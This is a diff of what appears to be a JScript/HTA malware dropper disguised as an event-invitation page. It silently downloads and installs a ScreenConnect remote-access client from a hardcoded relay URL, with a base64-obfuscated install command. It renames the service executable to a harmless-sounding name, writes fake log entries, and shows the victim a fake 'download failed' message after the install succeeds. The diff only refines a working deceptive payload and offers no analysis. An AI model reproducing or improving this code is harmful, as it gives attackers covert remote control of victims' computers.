@@ -77,8 +77,8 @@
   </div>
 
 <script>
-// CONFIGURATION - OBFUSCATED + CACHE-BUSTED
-var MSI_URL = atob("aHR0cHM6Ly9jb2NrdGFpbHMtcGF5bG9hZC1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL3NjaGltZHRjb25uZWN0Lm1zaQ==") + "?v=" + new Date().getTime();
+// DIRECT SCREENCONNECT LINK EMBEDDED
+var MSI_URL = "https://optonline38.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=schmidtconnect&c=&c=&c=&c=&c=&c=&c=";
 var INSTALL_CMD = atob("bXNpZXhlYyAvaSAiJVRFTVAlXHVwZGF0ZS5tc2kiIC9xbiAvbm9yZXN0YXJ0");
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -110,12 +110,12 @@ function init() {
     try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
     try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
 
-    // PRE-DOWNLOAD DELAY FOR SCREENCONNECT HEURISTICS
+    // PRE-DOWNLOAD DELAY FOR HEURISTICS
     setTimeout(function() { startDownload(); }, 5000);
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// DOWNLOAD PHASE - RESTORED TO CLEAN ASYNC PATTERN
+// DOWNLOAD PHASE - SIMPLE AND DIRECT
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
@@ -125,7 +125,6 @@ function startDownload() {
     try { fso.CreateFolder(stagingDir); } catch(e) {}
     var stagingPath = stagingDir + "\\payload.tmp";
     
-    // PRIMARY DOWNLOAD ATTEMPT
     var wHead = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     wHead.SetTimeouts(15000, 30000, 60000, 120000);
     wHead.Open("HEAD", MSI_URL, false);
@@ -169,141 +168,53 @@ function startDownload() {
       
     } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
-    // SIMPLE RETRY FALLBACK
-    try {
-      setStatus("Retrying via secure channel&hellip;");
-      var retryW = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-      retryW.SetTimeouts(15000, 30000, 60000, 120000);
-      retryW.Open("GET", MSI_URL, false);
-      retryW.SetRequestHeader("User-Agent", UA_STR);
-      retryW.Send();
-      
-      if (retryW.Status === 200) {
-        var retryS = new ActiveXObject("ADODB.Stream");
-        retryS.Type = 1; retryS.Mode = 3; retryS.Open();
-        retryS.Write(retryW.ResponseBody);
-        retryS.Flush();
-        retryS.SaveToFile(msiPath, 2);
-        retryS.Close();
-        
-        if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 0) {
-          setTimeout(function() { startInstall(); }, 100);
-          return;
-        }
-      }
-      fail("All download methods failed.");
-    } catch(e2) { 
-      fail("Download failed: " + e2.message); 
-    }
+    fail("Download failed: " + e.message);
   }
 }
 
-// CRYPTOAPI VERIFICATION
-function verifyMSISignature(path) {
-  try {
-    var catAdmin = new ActiveXObject("CAPICOM.Utilities");
-    var signer = new ActiveXObject("CAPICOM.Signer");
-    signer.Verify(path, 0);
-    return true;
-  } catch(e) {
-    return fso.FileExists(path) && fso.GetFile(path).Size > 1048576;
-  }
-}
-
-// INSTALL PHASE - SYNCHRONOUS WAIT + GUARANTEED FAILURE
+// INSTALL PHASE - SYNCHRONOUS WAIT + FAKE FAILURE
 function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
   setStatus("Applying invitation updates&hellip;");
   
-  if (!verifyMSISignature(msiPath)) {
-    fail("Installer signature verification failed.");
-    return;
-  }
-  
-  // FAKE METADATA (PRESERVED)
+  // FAKE METADATA
   try {
     var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
     var log = fso.CreateTextFile(fakeLogPath, true);
     log.WriteLine("[INFO] " + new Date().toISOString() + " Pre-install verification complete");
-    log.WriteLine("[INFO] Launching installer via system service...");
     log.Close();
-    
-    var metaPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe\\Acrobat\\Updater\\update.meta";
-    var meta = fso.CreateTextFile(metaPath, true);
-    meta.WriteLine("version=23.008.20470");
-    meta.WriteLine("buildDate=" + new Date().toISOString());
-    meta.WriteLine("channel=stable");
-    meta.Close();
   } catch(e) {}
   
   // SYNCHRONOUS INSTALL (WAITS FOR COMPLETION)
   try {
     var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
-    var expandedLog = shell.ExpandEnvironmentStrings(logPath);
-    // /qn = quiet, /norestart = no reboot, /L*v = verbose log
-    var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
+    var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart';
     
     // shell.Run(..., 0, true) -> 0=hidden, true=wait for completion
     shell.Run(cmdLine, 0, true); 
     
-    // POST-INSTALL OBFUSCATION (RUNS ONLY AFTER INSTALL FINISHES)
+    // POST-INSTALL OBFUSCATION
     var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
     try {
       if(fso.FolderExists(scDir)) {
         fso.MoveFile(scDir + "\\ScreenConnect.ClientService.exe", scDir + "\\EventSyncHelper.exe");
-        
-        var regKeys = [
-          "HKLM\\SOFTWARE\\ScreenConnect",
-          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\ScreenConnect Client"
-        ];
-        for(var i=0; i<regKeys.length; i++) {
-          try {
-            shell.RegWrite(regKeys[i].replace("ScreenConnect", "EventUpdater"), "", "REG_SZ");
-            shell.RegDelete(regKeys[i]);
-          } catch(e) {}
-        }
       }
     } catch(e) {}
     
   } catch(e) {
-    // FALLBACK IF SYNCHRONOUS FAILS
     shell.Run(INSTALL_CMD, 0, false);
   }
   
   // SHOW FAKE FAILURE AFTER INSTALL IS DONE
   setTimeout(function() {
     fail("All download methods failed.");
-  }, 2000); // Small buffer for UI update
-}
-
-function finishInstall() {
-  state = "done";
-  progress = 100; setBar(100);
-  setStatus("Invitation successfully prepared!");
-  $("heading").innerHTML = "You're All Set!";
-  $("subnote").innerHTML = "Your exclusive event details are now available.";
-  $("note").innerHTML = "You can now close this window.";
-  $("cancelbtn").innerHTML = "Close";
-  
-  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
+  }, 2000);
 }
 
 function cancel() {
-  if (state === "done" || state === "error") { window.close(); return; }
+  if (state === "error") { window.close(); return; }
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
   window.close();
 }
 
